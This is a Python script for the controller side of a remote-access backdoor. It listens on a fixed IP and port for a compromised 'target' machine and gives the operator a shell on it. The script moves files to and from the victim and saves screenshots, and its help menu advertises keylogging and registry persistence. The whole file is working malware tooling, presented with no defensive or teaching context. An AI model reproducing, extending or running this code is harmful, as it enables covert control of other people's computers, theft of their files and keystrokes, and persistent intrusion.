import socket
import json
import os


def reliableSend(data):
    jsonData = json.dumps(data)
    target.send(jsonData.encode())

def reliableRecv():
    data = ''
    while True:
        try:
            data+=target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

            
def uploadFile(Fname):
     f = open(Fname,'rb')
     target.send(f.read())

def downloadFile(fileName):
    f = open(fileName,'wb') #opening the file to read by bytes
    target.settimeout(1)#we need it for the except statement
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()




def target_comm():
    count=0
    while True:
        command=input('* Shell~%s: ' % str(ip))
        reliableSend(command)
        
        if command == 'quit': break
        elif command =='clear':os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            uploadFile(command[7:])
        elif command[:8] == 'download':
            downloadFile(command[8:])
        
        elif command[:10]=='screenshot':
            f = open('screenshot%d'%count,'wb') #opening the file to read by bytes
            target.settimeout(3)#we need it for the except statement
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count+=1
        elif command == 'help':
            print('''\n
            quit                            --> Quit session with target
            clear                           --> Clear screen
            cd                              --> Changes directory on target system
            upload                          --> Upload FIle to the target system
            download                        --> Donwload File From Target Machine
            keylog_start                    --> Start The Keylogger
            keylog_dump                     --> Print Keystrokes that the target inputed
            keylog_stop                     --> Stop and self destrut keylogger file
            persistence *regname* *filename*--> Create persistence in registery''')
        else:
            result = reliableRecv()
            print(result)

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('192.168.65.129',5555))
print('[+] listening for incoming connections')
sock.listen(5)
target,ip = sock.accept() ##their accepting the connections
print('[+] Target Connected From :'+str(ip))

target_comm()
